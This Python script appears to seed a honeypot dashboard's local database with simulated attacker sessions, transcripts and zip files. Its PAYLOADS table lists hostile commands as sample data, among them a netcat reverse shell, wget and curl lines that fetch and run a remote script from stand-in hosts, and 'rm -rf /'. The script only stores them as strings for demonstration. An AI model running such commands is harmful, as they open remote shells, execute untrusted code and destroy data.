#!/usr/bin/env python3
"""
simulate_attacks.py

Insert N fake sessions and events into hp_events.db to simulate
remote attackers from different countries/IPs. Also creates transcript
files and session FS zip files so the dashboard can download them.

Usage:
    python simulate_attacks.py   # runs with defaults
    python simulate_attacks.py --n 10 --start-ip 203.0.113.1

This script only modifies local files (hp_events.db, transcripts/, sessions_fs/, geoip_cache.json).
"""
import sqlite3, os, time, json, argparse, random, zipfile, shutil

BASE = os.path.dirname(__file__) or "."
DB_FILE = os.path.join(BASE, "hp_events.db")
TRANS_DIR = os.path.join(BASE, "transcripts")
FS_DIR = os.path.join(BASE, "sessions_fs")
GEO_CACHE = os.path.join(BASE, "geoip_cache.json")

os.makedirs(TRANS_DIR, exist_ok=True)
os.makedirs(FS_DIR, exist_ok=True)

# small country list with flags for demo
COUNTRIES = [
    ("US", "United States", "🇺🇸"),
    ("IN", "India", "🇮🇳"),
    ("GB", "United Kingdom", "🇬🇧"),
    ("CN", "China", "🇨🇳"),
    ("RU", "Russia", "🇷🇺"),
    ("BR", "Brazil", "🇧🇷"),
    ("DE", "Germany", "🇩🇪"),
    ("FR", "France", "🇫🇷"),
    ("JP", "Japan", "🇯🇵"),
    ("NL", "Netherlands", "🇳🇱"),
]

# payload templates (normal / suspicious / critical)
PAYLOADS = {
    "low": ["ls -la", "pwd", "whoami", "cat /etc/hosts", "echo hello"],
    "high": ["sudo apt update", "nmap -sV 192.168.1.1", "nc -e /bin/sh 10.0.0.5 4444", "cat /etc/passwd"],
    "critical": ["rm -rf /", "wget http://malware.example/payload.sh -O /tmp/x.sh; sh /tmp/x.sh", "curl http://evil/x.sh | sh", "python -c 'import socket;...'"]
}

def load_geo_cache():
    if os.path.exists(GEO_CACHE):
        try:
            return json.load(open(GEO_CACHE, "r"))
        except Exception:
            return {}
    return {}

def save_geo_cache(j):
    try:
        json.dump(j, open(GEO_CACHE, "w"), indent=2)
    except Exception:
        pass

def random_ip_from(start=None):
    # produce an IP in TEST ranges for demo: use 203.0.113.x (docs/test)
    if start:
        # parse start like '203.0.113.1'
        parts = start.split(".")
        base = ".".join(parts[:3])
        last = int(parts[3])
        last += random.randint(0, 250)
        last = last % 254 + 1
        return f"{base}.{last}"
    else:
        # random public-ish test ip in 203.0.113.x or 198.51.100.x or 192.0.2.x (documentation ranges)
        block = random.choice(["203.0.113", "198.51.100", "192.0.2"])
        return f"{block}.{random.randint(1,254)}"

def ensure_db():
    if not os.path.exists(DB_FILE):
        print("Database not found:", DB_FILE)
        print("Run `python -c \"import db; db.init_db()\"` first or start the dashboard once to init DB.")
        raise SystemExit(1)

def insert_session_and_events(ip, port, country, asn, n_events=3, start_ts=None):
    sid = f"sim-{ip.replace('.','-')}-{int(time.time())}-{random.randint(1000,9999)}"
    if start_ts is None:
        start_ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("INSERT OR REPLACE INTO sessions (id, client_ip, client_port, start_ts, end_ts, r_dns, country, asn, notes) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (sid, ip, port, start_ts, None, f"simulated-{ip}.example", f"{country}", asn, "simulated session"))
    # create events list mixing severities
    events = []
    ts_base = int(time.time())
    # Guarantee at least one low, one high, maybe one critical depending on random
    choices = ["low","low","low","high","critical"]
    for i in range(n_events):
        sev = random.choice(choices)
        payload = random.choice(PAYLOADS[sev])
        ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(ts_base - random.randint(0, 3600)))
        extra = json.dumps({"severity": sev})
        events.append((sid, ts, "recv", payload, ",".join([]), extra))
    cur.executemany("INSERT INTO events (session_id, ts, kind, payload, tags, extra_json) VALUES (?, ?, ?, ?, ?, ?)", events)
    conn.commit()
    conn.close()

    # write transcript
    tpath = os.path.join(TRANS_DIR, f"{sid}.log")
    with open(tpath, "w") as f:
        for ev in events:
            f.write(f"{ev[1]} RECV {ev[3]}\n")
            f.write(f"{ev[1]} SEND OK\n")
    # create session fs zip
    sdir = os.path.join(FS_DIR, sid)
    try:
        os.makedirs(sdir, exist_ok=True)
        with open(os.path.join(sdir, "README.txt"), "w") as f:
            f.write("Ephemeral FS for simulated session " + sid + "\n")
        # make small file to simulate /home/attacker/.ssh/id_rsa
        os.makedirs(os.path.join(sdir, "home"), exist_ok=True)
        with open(os.path.join(sdir, "home", "commands.txt"), "w") as f:
            f.write("\n".join([e[3] for e in events]))
        zipname = os.path.join(FS_DIR, f"{sid}.zip")
        # remove old zip if exists
        if os.path.exists(zipname):
            os.remove(zipname)
        shutil.make_archive(base_name=zipname[:-4], format='zip', root_dir=sdir)
    except Exception as e:
        print("Warning: could not create session fs zip:", e)
    return sid

def main(n=5, start_ip=None):
    ensure_db()
    geo = load_geo_cache()
    inserted = []
    for i in range(n):
        ip = random_ip_from(start_ip)
        port = random.randint(1025, 65500)
        country_code, country_name, flag = random.choice(COUNTRIES)
        asn = f"AS{random.randint(10000,99999)} SimISP-{country_code}"
        display_country = f"{flag} {country_name}"
        # update geo cache
        geo[ip] = {"country": display_country, "asn": asn, "hostname": f"simhost-{ip}.example"}
        sid = insert_session_and_events(ip, port, display_country, asn, n_events=random.randint(2,5))
        inserted.append((sid, ip, port, display_country, asn))
        print("Inserted simulated session:", sid, ip, port, display_country)
    save_geo_cache(geo)
    print(f"\nDone. Inserted {len(inserted)} fake sessions into {DB_FILE}.")
    print("Transcripts directory:", TRANS_DIR)
    print("Session FS zip files created under:", FS_DIR)
    print("Refresh your dashboard (login required) to view them.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate attacker sessions/events in hp_events.db")
    parser.add_argument("--n", type=int, default=5, help="number of simulated sessions to create")
    parser.add_argument("--start-ip", type=str, default=None, help="optional start IP (e.g. 203.0.113.1)")
    args = parser.parse_args()
    main(n=args.n, start_ip=args.start_ip)
